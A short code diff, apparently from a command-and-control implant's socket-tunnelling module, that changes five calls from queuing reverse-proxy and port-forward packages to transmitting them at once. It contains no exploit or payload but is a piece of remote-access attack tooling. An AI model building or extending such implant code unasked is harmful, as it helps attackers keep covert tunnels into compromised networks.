@@ -263,7 +263,7 @@ VOID SocketClients()
                     PackageAddInt32( Package, Client->FwdPort );
 
                     /* Send the socket open request */
-                    PackageQueue( Package );
+                    PackageTransmit( Package );
                     Package = NULL;
                 }
                 else
@@ -391,7 +391,7 @@ VOID SocketRead()
                 PackageAddBytes( Package, FullData.Buffer, FullData.Length );
 
                 /* now let's send it */
-                PackageQueue( Package );
+                PackageTransmit( Package );
             }
 
             if ( Failed )
@@ -407,7 +407,7 @@ VOID SocketRead()
                 PackageAddInt32( Package, ErrorCode );
 
                 /* now let's send it */
-                PackageQueue( Package );
+                PackageTransmit( Package );
             }
 
             if ( FullData.Buffer )
@@ -449,7 +449,7 @@ VOID SocketFree( PSOCKET_DATA Socket )
         PackageAddInt32( Package, Socket->FwdPort );
 
         /* Send the socket open request */
-        PackageQueue( Package );
+        PackageTransmit( Package );
         Package = NULL;
     }
 
@@ -465,7 +465,7 @@ VOID SocketFree( PSOCKET_DATA Socket )
         PackageAddInt32( Package, SOCKET_TYPE_REVERSE_PROXY );
 
         /* Send the socket open request */
-        PackageQueue( Package );
+        PackageTransmit( Package );
         Package = NULL;
     }
 
